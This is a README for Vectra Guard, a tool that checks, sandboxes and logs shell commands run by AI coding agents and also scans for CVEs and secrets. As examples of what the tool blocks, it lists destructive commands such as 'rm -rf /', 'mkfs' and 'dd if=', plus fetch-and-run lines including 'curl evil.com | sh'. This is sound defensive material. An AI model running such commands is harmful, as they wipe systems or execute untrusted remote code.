# Vectra Guard

> **Security Guard for AI Coding Agents & Development Workflows**

[![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](LICENSE)
[![Go Version](https://img.shields.io/badge/go-1.21+-00ADD8.svg)](https://golang.org/)
[![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Linux%20%7C%20Windows%20(x86%2FARM)-lightgrey.svg)]()
[![CI Status](https://github.com/xadnavyaai/vectra-guard/workflows/CI%2FCD%20Pipeline/badge.svg)](https://github.com/xadnavyaai/vectra-guard/actions)

**Contents:** [Why Vectra Guard](#-why-vectra-guard) · [Quick Start](#-quick-start) · [Features](#-features-by-impact) · [More features](#-more-features) · [Installation](#-installation) · [Usage](#-usage) · [Sandbox](#-complete-sandbox-guide) · [Configuration](#️-configuration)

## 🎯 Why Vectra Guard?

AI agents and automation run with your full shell access. One mistaken command can wipe a repo, delete system files, or push risky changes. Vectra Guard adds a safety layer that checks every command, isolates risky execution in a sandbox, and keeps a clear audit trail.

**At a glance**
- **Safety by default**: risky commands are analyzed before they run.
- **CVE scanning**: local cache + manifest scanning for known vulnerable deps.
- **Non-invasive install**: user-space by default with a one-line install and easy uninstall.
- **Sandbox + cache**: isolate unknown code and reuse cached dependencies.
- **Auditability**: review what ran, what was blocked, and why.
- **Agent confidence**: clear guardrails for agentic workflows without disrupting normal shells.

**What it protects against**
- Root or system deletion (`rm -rf /`, `rm -rf /etc`)
- Dangerous operations (`mkfs`, `dd if=`)
- Risky git actions (force push, history rewrites)
- Networked installs (`curl | sh`, `wget | bash`)
- Known vulnerable dependencies via CVE scanning
- Exposed secrets and risky code patterns (`vg scan-secrets`, `vg scan-security`), including deployment configs (bind 0.0.0.0, trust-proxy, auth off). Detection uses context-based secret flagging and comment-line skip to reduce false positives ([Control panel security](docs/control-panel-security.md#detection-behavior-scan-secrets-and-scan-security)).
- External HTTP(S) endpoints when using `vg`/`vectra-guard` (localhost only; override with `VECTRAGUARD_ALLOW_NET=1`)
- Sudo usage when using `vg`/`vectra-guard` (override with `VECTRAGUARD_ALLOW_SUDO=1`)

> 📖 **[View Complete Feature Guide →](FEATURES.md)** — Detailed examples, workflows, and use cases  
> 📖 **[Control panel & deployment security →](docs/control-panel-security.md)** — Checklist, CI examples, scan-security rule reference

---

## ⚡ Quick Start

### Install (30 seconds)

```bash
curl -fsSL https://raw.githubusercontent.com/xadnavyaai/vectra-guard/main/install.sh | bash
```

The installer defaults to user-space (`$HOME/.local/bin`). Ensure `~/.local/bin` is on `PATH`.

**Prereqs:** `curl` or `wget` (installer downloads the latest release binary).

**One-line uninstall:**

```bash
curl -fsSL https://raw.githubusercontent.com/xadnavyaai/vectra-guard/main/scripts/uninstall.sh | bash
```

### Use It (5 commands)

High-impact path — install, session, exec, audit, and CVE scan:

```bash
# 1. Validate scripts (safe - never executes)
vectra-guard validate my-script.sh

# 2. Start a session (recommended)
SESSION=$(vectra-guard session start --agent "manual")
export VECTRAGUARD_SESSION_ID=$SESSION

# 3. Execute commands safely
vectra-guard exec -- npm install

# 4. Audit what happened
vectra-guard audit session

# 5. CVE scan dependencies
vectra-guard cve sync --path . && vectra-guard cve scan --path .
```

**That's it!** The tool protects 30+ system directories across macOS, Linux, and Windows, and detects 200+ risky patterns automatically. **All commands run in sandbox by default** with intelligent caching for maximum security and performance.

For more features (trust store, context, roadmap, explain, seed agents, etc.) see [More features](#-more-features) and [FEATURES.md](FEATURES.md).

> **Need more details?** See [GETTING_STARTED.md](GETTING_STARTED.md) for a complete walkthrough.

---

## 🛡️ Features (by impact)

Ordered by impact. High-impact features first: protect commands, trace actions, and predetect risks.

### Install / Quick start

One-line setup so you can run the tool immediately. See [Installation](#-installation) for more options.

```bash
curl -fsSL https://raw.githubusercontent.com/xadnavyaai/vectra-guard/main/install.sh | bash
```

### Execution protection (`exec`)

Sandbox risky commands and block dangerous ones. Optional interactive approval for medium-risk actions.

```bash
vectra-guard exec -- npm install
```

### Script validation (`validate`)

Analyze scripts for security risks **without executing** — safe pre-check before you run anything.

```bash
vectra-guard validate scripts/deploy.sh
```

### Session and audit

Traceability: what ran, what was blocked, session IDs and audit logs.

```bash
SESSION=$(vectra-guard session start --agent "manual")
export VECTRAGUARD_SESSION_ID=$SESSION
vectra-guard exec -- npm install
vectra-guard audit session
```

### CVE scanning

Flag vulnerable dependencies before install. Sync a local CVE cache and scan manifests/lockfiles.

```bash
vectra-guard cve sync --path .
vectra-guard cve scan --path .
vectra-guard cve explain lodash@4.17.20 --ecosystem npm   # optional
```

### Secret and code scanning

Predetect before deploy: `scan-secrets`, `scan-security`, and `audit repo`. Find exposed secrets and risky code patterns (e.g. bind 0.0.0.0, trust-proxy, auth off). See [Control panel & deployment security](docs/control-panel-security.md) for checklist, CI examples, and rule reference.

```bash
vectra-guard scan-secrets --path .
vectra-guard scan-security --path . --languages go,python,c,config
```

---

## 📦 Installation

### Recommended (one line)

**macOS & Linux:**

```bash
curl -fsSL https://raw.githubusercontent.com/xadnavyaai/vectra-guard/main/install.sh | bash
```

**Windows (PowerShell):**

```powershell
irm https://raw.githubusercontent.com/xadnavyaai/vectra-guard/main/scripts/install-windows.ps1 | iex
```

- **Platform**: macOS, Linux, Windows (x86_64, arm64)
- **What it does**: downloads latest release → installs to user-space → makes `vectra-guard` (and `vg` alias) available
- **Prereqs**: `curl` or `wget` (Unix) / PowerShell 5.1+ (Windows)

### One-command full setup (deps + tool)

```bash
curl -fsSL https://raw.githubusercontent.com/xadnavyaai/vectra-guard/main/scripts/install-all.sh | bash
```

### Other ways to install

- **Build from source**: `git clone https://github.com/xadnavyaai/vectra-guard.git && cd vectra-guard && go build -o vectra-guard .`  
- **Go developers**: `go install github.com/xadnavyaai/vectra-guard@latest` (builds from source)  
- **Build from source / advanced options**: see **[GETTING_STARTED.md](GETTING_STARTED.md)** (“Installation options” section)

### Upgrade

```bash
# Re-run the installer to upgrade to latest
curl -fsSL https://raw.githubusercontent.com/xadnavyaai/vectra-guard/main/install.sh | bash
```

### Uninstall

```bash
# Interactive uninstall (removes binary, shell integration, optionally data)
curl -fsSL https://raw.githubusercontent.com/xadnavyaai/vectra-guard/main/scripts/uninstall.sh | bash

# Manual uninstall
rm -f ~/.local/bin/vectra-guard
rm -rf ~/.vectra-guard  # Optional: removes all data
```

### After Installation

Use Vectra Guard commands directly:

```bash
# Initialize configuration
vectra-guard init

# Initialize repo-local config + cache
vectra-guard init --local

# Validate a script
vectra-guard validate your-script.sh

# Execute a command safely
vectra-guard exec "npm install"
```

**That's it!** See **[GETTING_STARTED.md](GETTING_STARTED.md)** for detailed usage examples.

---

## 🚀 Sandbox overview

Vectra Guard includes a **smart sandbox** that isolates risky commands (like networked installs) while keeping day‑to‑day workflows fast.

- **Presets**: Use `presets/developer.yaml`, `presets/ci-cd.yaml`, or `presets/production.yaml` as starting points (see [CONFIGURATION.md](CONFIGURATION.md#quick-start-presets)).
- **Always mode (default)**: All commands run in sandbox for maximum security with intelligent caching for 10x speedup.
- **Auto mode**: Low‑risk commands run on host; medium/high‑risk commands automatically run in a sandbox.
- **Caching**: Dependency caches (npm, pip, cargo, etc.) are mounted into the sandbox for 10x faster repeated installs.
- **Trust store**: Frequently used commands can be approved once and then run at full speed on the host.

For a full walkthrough (modes, cache strategy, performance benchmarks, and examples), see **[SANDBOX.md](SANDBOX.md)**.

---

## 📖 What Gets Protected?

**Protected Directories (30+ across platforms):**
- **Linux/Unix**: `/bin`, `/sbin`, `/usr`, `/etc`, `/var`, `/lib`, `/opt`, `/boot`, `/root`, `/sys`, `/proc`, `/dev`, `/home`, `/srv`, `/run`, `/mnt`, `/media`, `/snap`, `/flatpak`
- **macOS**: `/Applications`, `/Library`, `/System`, `/private`, `/Users`, `/Volumes`, `/Network`, `/cores`

**Risky Commands Detected:**
- Root deletion: `rm -rf /`, `rm -r /*`
- System directory operations: `rm -rf /etc`, `chmod -R /bin`
- Dangerous operations: `sudo`, `mkfs`, `dd if=`
- Network installs: `curl | sh`, `wget | bash`
- And 200+ more patterns

**Example:**
```bash
$ vectra-guard exec -- rm -rf /etc
[ERROR] risky command blocked
high risk command blocked by guard level medium
```

---

## 🎯 More features

Additional features that improve workflow and convenience, ordered by impact. See [FEATURES.md](FEATURES.md) for detailed examples.

- **Seed agents / IDE & platform integration** — Seed agent instructions into repos for Cursor, VS Code, Claude, Codex, Windsurf, Copilot, and OpenClaw. See FEATURES.md for `seed agents` and IDE tasks.
- **Explain** — Human-friendly reasons why a script is risky: `vectra-guard explain risky-script.sh`.
- **Trust store** — Approve and remember commands to skip sandbox; `vg trust add/list`.
- **Context summaries & roadmap** — Code mapping and planning for agents: `vg context summarize`, `vg roadmap add/list`.
- **Sandbox metrics & shell tracker** — View sandbox usage and time saved; optional shell hook to log commands. See FEATURES.md.
- **Lockdown, prompt firewall, validate-agent** — Stricter enforcement and agent-specific validation. See FEATURES.md.
- **Package audits (npm/python)** — `vectra-guard audit npm --path .` / `audit python` (distinct from CVE scan).
- **Container mode, git pre-commit, IDE integration** — Maximum isolation, hooks, and IDE-specific tasks. See [Enforcement modes](#-enforcement-modes) and [IDE & Tool Integration](#-ide--tool-integration).

---

## 🚀 Usage

Reference section: high-impact commands first, then more.

### High-impact commands

```bash
# Validate scripts (never executes)
vectra-guard validate deploy.sh

# Session + exec + audit
SESSION=$(vectra-guard session start --agent "manual")
export VECTRAGUARD_SESSION_ID=$SESSION
vectra-guard exec -- npm install
vectra-guard audit session

# CVE scanning
vectra-guard cve sync --path .
vectra-guard cve scan --path .
vectra-guard cve explain express-validator@6.15.0 --ecosystem npm

# Secret and code scanning
vectra-guard scan-secrets --path .
vectra-guard scan-security --path . --languages go,python,c,config
vectra-guard audit repo --path .
```

### More commands

```bash
# Initialize configuration
vectra-guard init
vectra-guard init --local

# Explain security risks
vectra-guard explain risky-script.sh

# Execute with interactive approval
vectra-guard exec --interactive sudo apt update

# Package audits (npm/python)
vectra-guard audit npm --path .
vectra-guard audit python --path .
```

### CVE Awareness

Use the built-in CVE cache to scan manifests and explain known vulnerabilities.

```bash
# Sync CVE cache (OSV-backed)
vectra-guard cve sync --path .

# Scan manifests/lockfiles
vectra-guard cve scan --path .

# Explain a specific package/version
vectra-guard cve explain express-validator@6.15.0 --ecosystem npm
```

### Package Audits

Use built-in package auditing to surface known vulnerabilities.

```bash
# npm audit in a project directory
vectra-guard audit npm --path /path/to/project

# python audit (uses requirements.txt when present)
vectra-guard audit python --path /path/to/project

# Disable auto-install of audit tools
vectra-guard audit npm --path . --no-install
vectra-guard audit python --path . --no-install
```

### Session Management

```bash
# Start a session
SESSION=$(vectra-guard session start --agent "cursor-ai")
export VECTRAGUARD_SESSION_ID=$SESSION

# Commands are automatically tracked
npm install
npm test
git push

# View session activity
vectra-guard session show $SESSION

# List all sessions
vectra-guard session list

# End session
vectra-guard session end $SESSION
```

### Trust Management (NEW!)

```bash
# List trusted commands
vg trust list

# Trust a command permanently
vg trust add "npm install express" --note "Common package"

# Trust with expiration
vg trust add "npm test" --duration "7d"

# Remove trusted command
vg trust remove "npm install express"

# Clean expired entries
vg trust clean
```

### Context Summaries

```bash
# Summarize a single file
vg context summarize code cmd/root.go --max 5
vg context summarize docs README.md --max 3

# Summarize entire repository (works across repo after init)
vg context summarize code . --max 5
vg context summarize docs . --max 3
vg context summarize advanced internal/ --max 3

# JSON output for programmatic use (perfect for AI agents!)
vg context summarize code . --output json --max 10

# Only process changed files (great for PR reviews)
vg context summarize code . --since HEAD~1
vg context summarize code . --since 2024-01-01  # Since date
vg context summarize code . --since abc123def   # Since commit

# Results are cached in .vectra-guard/cache/ for faster subsequent runs
# Run 'vg init --local' first to set up repo-local cache
```

### Help Topics

```bash
# Show available help topics
vg help

# Get detailed usage for roadmap and context
vg help roadmap
vg help context
```

### Roadmap Planning (NEW!)

```bash
# Add a roadmap item for agent + human planning
vg roadmap add --title "Improve cache heuristics" --summary "Tune cache hit scoring" --tags "agent,performance"

# List recent roadmap items
vg roadmap list

# Show a roadmap item with logs
vg roadmap show rm-123456789

# Update status
vg roadmap status rm-123456789 in-progress

# Attach a log entry (optionally link a session)
vg roadmap log rm-123456789 --note "Investigated cache hit rate" --session $VECTRAGUARD_SESSION_ID
```

### Sandbox Metrics (NEW!)

```bash
# View sandbox usage metrics
vg metrics show

# Output:
# Total Executions:    142
#   - Host:            89 (62.7%)
#   - Sandbox:         53 (37.3%)
#   - Cached:          41 (28.9%)
# Average Duration:    1.2s

# JSON format
vg metrics show --json

# Reset metrics
vg metrics reset
```

### With Shell Tracker (Automatic)

After installing the shell tracker, sessions start automatically and all commands are logged:

```bash
# Just use your terminal normally
npm install        # ✅ Logged
rm -rf dist/       # ✅ Logged
sudo apt update    # ✅ Logged

# Check what happened
vectra-guard session show $VECTRAGUARD_SESSION_ID
```

---

## 📦 Complete Sandbox Guide

### Understanding the Sandbox System

Vectra Guard's sandbox system provides **three modes of operation**:

#### 1. **Without Sandbox** (Traditional Mode - Optional)
```bash
# Disable sandbox completely
sandbox:
  enabled: false
# OR
sandbox:
  mode: never

# All commands run directly on host
vg exec "npm install"  # → Direct execution
vg exec "rm -rf test/" # → Direct execution (with validation)

# Note: High-risk commands (rm -rf /, etc.) still blocked even if sandbox disabled
```

**Use When:**
- You trust all executed commands
- You're on a personal machine with no sensitive data
- Performance is absolute priority
- You want traditional validation-only behavior

**Security:** Validation only, no isolation (except critical commands which cannot be bypassed)

---

#### 2. **With Sandbox - Always Mode** (Default ⭐ - Maximum Security)
```bash
# Everything runs in sandbox (default configuration)
sandbox:
  enabled: true
  mode: always  # Default: maximum security
  enable_cache: true  # Default: 10x speedup with caching

# All commands run in sandbox with caching
vg exec "echo hello"        # → Sandbox (cached, fast)
vg exec "npm install"       # → Sandbox (cached, 10x faster after first run)
vg exec "curl remote.com"   # → Sandbox (isolated)
vg exec "rm -rf /"          # → Blocked (critical risk, cannot bypass)
```

**Use When:**
- **Default mode** - maximum security out of the box
- Running completely untrusted code
- Working with AI agents
- You want provable isolation
- Development speed matters (caching provides 10x speedup)

**Security:** Complete isolation for everything with intelligent caching

**Performance:** First run normal speed, subsequent runs 10x faster due to comprehensive caching

#### Example: Cache-Optimized Secure Sandbox
```yaml
sandbox:
  enabled: true
  mode: always
  security_level: strict
  enable_cache: true
  network_mode: restricted
  show_runtime_info: true
```

```bash
vg exec "npm ci"  # first run builds cache (isolated)
vg exec "npm ci"  # cached and fast, still sandboxed
```

---

#### 3. **With Sandbox - Auto Mode** (Balanced Security & Speed)
```bash
# Smart sandboxing based on risk
sandbox:
  enabled: true
  mode: auto  # Auto-detect based on risk
  enable_cache: true

# Low-risk commands run on host
vg exec "echo hello"        # → Host (instant)
vg exec "ls -la"            # → Host (instant)
vg exec "git status"        # → Host (instant)

# Medium/high-risk commands run in sandbox
vg exec "npm install"       # → Sandbox (cached, fast)
vg exec "curl remote.com"   # → Sandbox (isolated)
vg exec "rm -rf /"          # → Blocked (critical risk)
```

**Use When:**
- You want balance of security and speed
- You're working with trusted code
- You want automatic protection without thinking about it
- Development speed matters

**Security:** Smart isolation based on risk analysis

---

### The Caching Magic: How It Works 🚀

#### The Problem: Slow Repeated Installs

Without caching, every sandbox execution starts fresh:

```bash
# Without cache: SLOW ❌
vg exec "npm install express"
# → Creates fresh container
# → Downloads 50 packages from internet: 12.3s
# → Container destroyed

vg exec "npm install lodash"
# → Creates NEW fresh container
# → Downloads 30 packages AGAIN: 8.7s
# → Container destroyed

# Total wasted: ~21 seconds + repeated downloads
```

#### The Solution: Shared Cache Mounts

Vectra Guard mounts your **host cache directories** into the sandbox:

```bash
# WITH cache: FAST ✅
vg exec "npm install express"
# → Creates container
# → Mounts ~/.npm into container
# → Checks cache FIRST (most packages already there!)
# → Only downloads NEW/MISSING packages: 1.2s ⚡
# → Cache persists on host

vg exec "npm install lodash"  
# → Creates NEW container
# → Mounts SAME ~/.npm cache
# → Finds express deps ALREADY in cache!
# → Only downloads lodash: 0.8s ⚡
# → Everything reused!

# Total time: ~2 seconds (vs 21 seconds!)
# 🎉 10x FASTER
```

#### How Cache Mounting Works

```
┌──────────────────────────────────────────────────────────────┐
│                      Your Host Machine                        │
├──────────────────────────────────────────────────────────────┤
│                                                               │
│  ~/.npm/                  ← Cache persists here             │
│    ├── express/           ← Already downloaded              │
│    ├── lodash/            ← Already downloaded              │
│    └── ... 1000+ packages ← Accumulated over time           │
│                                                               │
│  ┌────────────────────────────────────────────────┐         │
│  │          Docker Container (Sandbox)             │         │
│  │  ┌──────────────────────────────────────────┐  │         │
│  │  │  Mounted:  /.npm  →  Points to ~/.npm   │  │         │
│  │  │            (SHARED with host!)           │  │         │
│  │  └──────────────────────────────────────────┘  │         │
│  │                                                  │         │
│  │  When npm runs inside:                          │         │
│  │  1. Checks /.npm cache                         │         │
│  │  2. Finds packages already there! ✅            │         │
│  │  3. No download needed                         │         │
│  │  4. Installs in seconds ⚡                      │         │
│  └────────────────────────────────────────────────┘         │
│                                                               │
└──────────────────────────────────────────────────────────────┘
```

#### Supported Cache Directories

Vectra Guard automatically detects and mounts caches for:

| Ecosystem | Host Cache Location | Container Mount | Speedup |
|-----------|-------------------|----------------|---------|
| **Node.js** | `~/.npm` | `/.npm` | 10x faster |
| **Node.js** | `~/.yarn` | `/.yarn` | 8x faster |
| **Node.js** | `~/.pnpm` | `/.pnpm` | 12x faster |
| **Python** | `~/.cache/pip` | `/.cache/pip` | 9x faster |
| **Go** | `~/go/pkg` | `/go/pkg` | 11x faster |
| **Rust** | `~/.cargo` | `/.cargo` | 15x faster |
| **Ruby** | `~/.gem` | `/.gem` | 7x faster |

#### Custom Cache Configuration

```yaml
sandbox:
  enable_cache: true
  
  # Add custom cache directories
  cache_dirs:
    - ~/.custom-cache
    - ~/.local/share/package-cache
    - /opt/company/cache
```

---

### Developer Experience: The Complete Workflow

#### Scenario: Building a New Project

**Day 1: Initial Setup**
```bash
# 1. Clone project
git clone https://github.com/company/app.git
cd app

# 2. Configure Vectra Guard (one-time)
cp presets/developer.yaml vectra-guard.yaml

# 3. Install dependencies (first time - builds cache)
vg exec "npm install"
📦 Running in sandbox.
   Why: medium risk + networked install
# Downloads ~500 packages: 45 seconds
# Cache is now populated! 🎉

# 4. Run tests (trusted command)
vg exec "npm test" --interactive
Options: y/r/n
Choose: r  # Remember this command
✅ Approved and remembered

# Next time:
vg exec "npm test"
# → Runs on HOST (trusted), instant! ⚡
```

**Day 2-∞: Daily Development**
```bash
# Morning: Update dependencies
vg exec "npm install"
📦 Running in sandbox (cached).
   Why: medium risk + networked install
# Uses cache: 2 seconds! ⚡ (was 45s yesterday)

# Add new package
vg exec "npm install react-query"
📦 Running in sandbox (cached).
# Only downloads react-query (already has 499 others!)
# Takes: 3 seconds ⚡

# Run build (trusted)
vg exec "npm run build"
# → Host execution (trusted), full speed

# Run dev server (trusted)
vg exec "npm run dev"
# → Host execution (trusted), no overhead
```

**Key Benefits:**
- ✅ **First install**: Protected in sandbox
- ✅ **Subsequent installs**: 10x faster with cache
- ✅ **Trusted commands**: Zero overhead
- ✅ **New packages**: Only download new ones
- ✅ **Total time saved**: Hours per week!

---

### Performance Comparison

#### Scenario: Installing 50 packages

**Without Vectra Guard Sandbox:**
```bash
npm install
# 50 packages, 12.3s
```

**With Sandbox (First Time):**
```bash
vg exec "npm install"
# 50 packages, 12.8s (+0.5s overhead)
# Cache populated ✅
```

**With Sandbox (Subsequent - MAGIC!):**
```bash
vg exec "npm install"
# 50 packages, 1.2s ⚡
# 10x FASTER than even direct execution!
# Why? Cache hits + no network!
```

#### Real-World Benchmarks

| Operation | Direct | Sandbox (No Cache) | Sandbox (Cached) | Speedup |
|-----------|--------|-------------------|------------------|---------|
| npm install (50 pkg) | 12.3s | 12.8s | 1.2s | **10.2x** ⚡ |
| pip install (20 pkg) | 8.7s | 9.1s | 0.9s | **9.6x** ⚡ |
| cargo build | 45.2s | 46.1s | 4.1s | **11.0x** ⚡ |
| go mod download | 3.4s | 3.6s | 0.4s | **8.5x** ⚡ |

**Overhead:**
- First run: +3-5% (builds cache)
- Cached runs: **10x FASTER** than direct!
- Trusted commands: 0% (runs on host)

---

### Trust Store: Learning Your Patterns

#### The Problem: Too Many Prompts

Without trust store:
```bash
vg exec "npm test"     # → Prompt every time ❌
vg exec "npm test"     # → Prompt again ❌
vg exec "npm test"     # → Still prompting ❌
# Annoying! 😤
```

#### The Solution: Approve Once, Remember Forever

```bash
# First time
vg exec "npm test" --interactive
⚠️  Command requires approval
Options:
  y  - Yes, run once
  r  - Yes, and remember (trust permanently) ← Choose this!
  n  - No, cancel
Choose: r
✅ Approved and remembered

# Every subsequent time
vg exec "npm test"
# → Runs immediately on HOST ⚡
# → No prompt, no sandbox, instant!
```

#### Managing Trusted Commands

```bash
# List what you trust
vg trust list
COMMAND              APPROVED    USE COUNT  LAST USED
npm test            2024-12-24  47         2024-12-24 15:30
npm run build       2024-12-23  23         2024-12-24 14:15
git status          2024-12-22  156        2024-12-24 15:45

# Add trusted commands manually
vg trust add "npm run dev" --note "Dev server"
vg trust add "docker-compose up" --duration "30d"

# Remove if needed
vg trust remove "old-command"

# Clean expired entries
vg trust clean
```

---

### Metrics: See Your Savings

```bash
vg metrics show

Vectra Guard Sandbox Metrics
===============================
Total Executions:    1,247
  - Host:            834 (66.9%)   ← Trusted commands
  - Sandbox:         413 (33.1%)   ← Risky commands  
  - Cached:          389 (31.2%)   ← Cache hits! 🎉

Average Duration:    0.8s

By Risk Level:
  - low: 834 (66.9%)     ← Running on host
  - medium: 387 (31.0%)  ← Sandboxed but cached
  - high: 26 (2.1%)      ← Sandboxed, slower

By Runtime:
  - docker: 413

Time Saved (estimated): 4.2 hours this week! ⚡

Last Updated: 2024-12-24T15:45:00Z
```

**What This Tells You:**
- 67% of commands trusted → Fast path
- 31% cached → 10x faster
- Only 2% truly risky → Properly isolated
- **Result**: Security + Speed! 🎉

---

## ⚙️ Configuration

Create `vectra-guard.yaml` in your project or `~/.config/vectra-guard/config.yaml`.

We recommend using one of the **Quick Start Presets** (Developer, CI/CD, or Production) found in [CONFIGURATION.md](CONFIGURATION.md#quick-start-presets).

For full configuration options, see [CONFIGURATION.md](CONFIGURATION.md).

---

## 🔒 Enforcement Modes

Vectra Guard provides multiple enforcement levels based on your security needs:

### Level 1: Opt-in Validation (Development)
```bash
vectra-guard exec npm install
vg exec npm install  # shorthand
```
✅ Good for: Development, testing, trusted environments  
⚠️ Can be bypassed if not using `exec` command

### Level 2: Shell Integration (Recommended) ⭐
✅ **Automatic protection** for all shell commands  
✅ Works in Cursor, VSCode, Terminal, everywhere  
✅ Transparent, no workflow changes  
✅ **Auto-detects context** and adjusts security  
⚠️ Advanced bypass possible (requires expertise)

### Level 3: Container Isolation (Optional)
```bash
# Basic container with auto-detection
docker-compose up vectra-guard

# Strict isolation for untrusted code
docker-compose up vectra-guard-isolated
```
✅ **Complete isolation** - runs in container  
✅ Useful for testing or high-security scenarios  
✅ Read-only filesystem options available  

**Focus**: We recommend **Level 2 (Shell Tracker)** with `auto` guard level for most users.

**See**: [`docker-compose.yml`](docker-compose.yml) for optional containerized setup

---

## 🔗 IDE & Tool Integration

### Universal Approach (Works Everywhere)

The shell tracker automatically records:

| Tool/Context | Tracked? | Setup Required |
|--------------|-----------|----------------|
| **Cursor** | ✅ | None |
| **VSCode** | ✅ | None |
| **Terminal** | ✅ | None |
| **Any IDE** | ✅ | None |
| **SSH Sessions** | ✅ | None |
| **Scripts** | ✅ | None |

### IDE-Specific Tasks (Optional)

You can also add protected tasks to your IDE. Create `.vscode/tasks.json`:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "🛡️ Protected: Install",
      "type": "shell",
      "command": "vectra-guard exec -- npm install"
    },
    {
      "label": "🛡️ Protected: Test",
      "type": "shell",
      "command": "vectra-guard exec -- npm test"
    },
    {
      "label": "🛡️ Protected: Build",
      "type": "shell",
      "command": "vectra-guard exec -- npm run build",
      "group": {
        "kind": "build",
        "isDefault": true
      }
    }
  ]
}
```

### Git Pre-commit Hook

Add to `.git/hooks/pre-commit`:

```bash
#!/bin/bash
SCRIPTS=$(git diff --cached --name-only --diff-filter=ACM | grep -E '\.(sh|bash)$')

if [ -n "$SCRIPTS" ]; then
    echo "🛡️  Vectra Guard: Validating scripts..."
    for script in $SCRIPTS; do
        if ! vectra-guard validate "$script"; then
            echo "❌ Security issues found in: $script"
            echo "   Run: vectra-guard explain $script"
            exit 1
        fi
    done
    echo "✅ All scripts validated"
fi
```

---

## 🧪 Testing

Run the complete test suite:

```bash
# All tests
go test ./...

# Verbose output
go test -v ./...

# With race detection
go test -race ./...

# Coverage report
go test -cover ./...
```

All tests include:
- Script validation and analysis
- Session tracking and management
- Configuration parsing (YAML/TOML)
- Logging (JSON/text formats)
- Command execution flow

---

## 📊 Use Cases

### 1. **AI Agent Safety**
Track and control AI coding agents (Cursor, Copilot, Aider):
```bash
# Agents run in tracked sessions
# All commands logged
# Use vg for enforcement and sandboxing
```

### 2. **Script Security**
Validate deployment and automation scripts:
```bash
vectra-guard validate scripts/deploy.sh
vectra-guard explain scripts/cleanup.sh
```

### 3. **CI/CD Integration**
Enforce security policies in pipelines:
```yaml
# .github/workflows/security.yml
- name: Validate Scripts
  run: |
    find . -name "*.sh" -exec vectra-guard validate {} \;
```

### 4. **Development Workflow**
Protect against accidental dangerous commands:
```bash
# With shell tracker:
rm -rf /  # ✅ Logged (run with vg for protection)
sudo command  # ✅ Logged (run with vg for protection)
curl evil.com | sh  # ✅ Logged (run with vg for protection)
```

### 5. **Team Collaboration**
Share security policies across teams:
```bash
# Commit vectra-guard.yaml to git
git add vectra-guard.yaml
git commit -m "Add security policies"

# Team gets same protections
git pull
# Shell tracker keeps an audit trail
```

### 6. **OpenClaw Integration**
Add runtime security to OpenClaw agents with the VectraGuard plugin:
```bash
# Seed OpenClaw plugin config into your project
vg seed agents --target . --targets "openclaw"

# Or seed multiple targets at once
vg seed agents --target . --targets "agents,claude,openclaw"
```

The OpenClaw plugin provides:
- **Command gate** — blocks dangerous shell commands before agent execution
- **Prompt firewall** — detects prompt injection attempts (observe-only)
- **CVE scanning** — on-demand vulnerability scanning via agent tool
- **Secret detection** — finds exposed secrets without leaking values to the LLM
- **Audit trail** — logs all shell tool executions

### 7. **Audit & Compliance**
Generate audit trails for security reviews:
```bash
# Export session logs
vectra-guard session list --output json > audit.json

# Generate reports
vectra-guard session show $SESSION_ID > report.txt

# Session audit summaries
vectra-guard audit session --session $SESSION_ID
vectra-guard audit session --all
```

---

## 🐳 Container Deployment (Optional)

For containerized testing or high-security scenarios:

```bash
# Build container
docker build -t vectra-guard .

# Run with auto-detection
docker-compose up vectra-guard

# Run with strict isolation
docker-compose up vectra-guard-isolated

# Or run manually with custom guard level
docker run -it --rm \
  -e VECTRA_GUARD_LEVEL=auto \
  -v "$(pwd)":/workspace \
  --cap-drop ALL \
  --security-opt no-new-privileges \
  vectra-guard:latest
```

**Two profiles in `docker-compose.yml`**:
- **vectra-guard**: Standard containerized execution with auto-detection
- **vectra-guard-isolated**: Strict isolation (read-only, no network) for untrusted code

**Note**: Most users should use the **CLI tool** directly with the shell tracker for logging. Containers are optional for specific use cases.

---

## 📈 Roadmap

- [x] Script validation and risk analysis
- [x] Session tracking and management
- [x] Command execution wrapper
- [x] Risk scoring and violations
- [x] Shell tracker integration (bash/zsh/fish)
- [x] Container isolation with Docker
- [x] Seccomp syscall filtering
- [x] Multiple enforcement modes
- [x] **Auto-detection** (context-aware protection)
- [x] Simplified configuration (clean, rock solid)
- [ ] File operation monitoring (in progress)
- [ ] Network policy enforcement
- [ ] VSCode/Cursor extensions
- [ ] Web-based approval UI
- [ ] ML-based anomaly detection
- [ ] eBPF kernel-level monitoring
- [ ] Team collaboration features

---

## 🤝 Contributing

Contributions are welcome! Please:

1. Follow guidelines in [`GO_PRACTICES.md`](GO_PRACTICES.md)
2. Add tests for new features
3. Update documentation
4. Run `go fmt`, `go vet`, and tests before submitting

**Development workflow**:
```bash
# Format code
go fmt ./...

# Run linters
go vet ./...

# Run tests
go test ./...

# Build
go build -o vectra-guard main.go
```

---

## 📄 Project Structure

```
vectra-guard/
├── cmd/                    # CLI command implementations
│   ├── root.go            # Main CLI router
│   ├── init.go            # Config initialization
│   ├── validate.go        # Script validation
│   ├── explain.go         # Risk explanation
│   ├── exec.go            # Protected execution
│   └── session.go         # Session management
├── internal/              # Internal packages
│   ├── analyzer/          # Script analysis engine
│   ├── config/            # Configuration management
│   ├── logging/           # Structured logging
│   ├── session/           # Session tracking
│   └── daemon/            # Background monitoring
├── scripts/               # Installation & setup scripts
│   ├── install-shell-wrapper.sh
│   ├── setup-cursor-protection.sh
│   └── container-entrypoint.sh
├── main.go                # Entry point
├── Dockerfile             # Container image
├── docker-compose.yml     # Container orchestration
├── seccomp-profile.json   # Syscall filtering
├── Project.md             # Original vision
├── roadmap.md             # Development plan
└── GO_PRACTICES.md        # Coding standards
```

---

## 🔐 Security

### Threat Model

Vectra Guard is designed to protect against:
- **Accidental execution** of dangerous commands
- **Malicious scripts** from untrusted sources
- **AI agent misbehavior** or overly aggressive actions
- **Supply chain attacks** via malicious dependencies
- **Privilege escalation** attempts
- **Data exfiltration** via network commands

### Limitations

**Opt-in mode** can be bypassed if commands don't use `vectra-guard exec`.

**Shell tracker** provides command logging across tools; protection only applies when running via `vg` or `vectra-guard`.

**Container isolation** provides maximum security (95%+ effective) and is recommended for production and untrusted code.

### Reporting Issues

For security issues, please email the maintainers directly rather than opening public issues.

---

## 📚 Additional Resources

### Core Documentation
- **[GETTING_STARTED.md](GETTING_STARTED.md)** - Step-by-step walkthrough for new users
